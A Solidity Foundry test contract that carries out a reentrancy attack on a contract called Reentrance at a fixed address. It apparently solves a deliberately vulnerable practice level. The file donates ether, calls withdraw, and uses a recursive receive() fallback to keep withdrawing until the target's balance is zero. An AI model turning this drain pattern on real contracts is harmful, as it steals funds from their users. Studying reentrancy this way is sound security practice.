// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Reentrance} from "../src/Reentrance.sol";

contract AttackTest is Test {
    Reentrance public reentr = Reentrance(payable(0x48e31baf0890A58BBE6C57A1a62E15ec85474065));

    uint256 amnt = 0.001 ether;

    bool public funded;

    function testAttack() public {
        reentr.donate{value: amnt}(address(this));

        funded = true;

        console.log(address(reentr).balance);
        reentr.withdraw(amnt);
        console.log(address(reentr).balance);

        assertEq(address(reentr).balance, 0);   
    }

    receive() external payable {
        if (funded) {
            if (address(reentr).balance > 0) {
                reentr.withdraw(amnt);
            }
        } else {
            funded = true;
        }
    }
}
